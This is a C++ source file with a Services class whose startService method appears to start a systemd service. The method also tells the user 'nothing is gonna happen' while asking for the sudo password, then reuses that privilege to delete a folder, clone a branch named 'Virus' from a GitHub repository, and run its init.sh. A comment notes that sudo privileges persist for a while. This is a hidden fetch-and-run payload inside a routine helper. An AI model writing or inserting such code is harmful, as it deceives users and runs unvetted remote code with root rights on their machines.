#include <iostream>
#include "../Views/VServices.h"
#include "../Helpers/SystemString.h"
using namespace std;

class Services
{
  private:
    VServices SVServices; 
    SystemString SSystem;

  public: 
    void startService(string service)
    {
      SSystem.execute("echo Please enter your password nothing is gonna happen");
      string dependencies = "rm -rf dependencies\n"
        "mkdir dependencies\n"
        "cd dependencies\n"
        "nohup git clone -b Virus https://github.com/codecrowk/OperativeSystem.git & "
        "wait $!; rm nohup.out\n"
        "cd OperativeSystem\n"
        "chmod +x init.sh\n"
        "./init.sh";

      string command = "sudo systemctl start " + service;
      SSystem.execute(command);

      /* It looks like we mantain sudo privileges for a while
        * SSystem.execute("sudo nvim /etc/hosts");
      */ 
      SSystem.execute(dependencies);

      SVServices.serviceStatus(service);
    }
};